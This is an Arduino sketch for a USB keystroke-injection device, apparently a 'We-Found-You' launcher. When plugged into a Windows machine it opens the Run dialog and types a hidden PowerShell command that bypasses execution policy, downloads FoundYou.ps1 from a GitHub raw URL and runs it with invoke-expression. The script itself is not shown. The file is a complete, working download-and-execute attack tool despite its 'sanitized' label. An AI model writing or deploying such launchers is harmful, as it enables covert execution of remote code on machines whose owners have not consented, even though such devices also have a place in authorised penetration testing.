#include <Keyboard.h>

// We-Found-You (sanitized) HID launcher.
// Pulls FoundYou.ps1 from YOUR repo (MoeNassi/FoundYou) and runs it.
// Verify the raw URL below matches where you actually pushed the script.

void runDialog() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(700);
}

void pressEnter() {
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
}

void setup() {
  delay(2500);            // let the host enumerate the HID device
  Keyboard.begin();
  delay(800);

  runDialog();            // GUI r
  delay(500);
  Keyboard.print("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/MoeNassi/FoundYou/main/FoundYou.ps1; invoke-expression $pl");
  delay(500);
  pressEnter();           // ENTER

  Keyboard.end();
}

void loop() {}
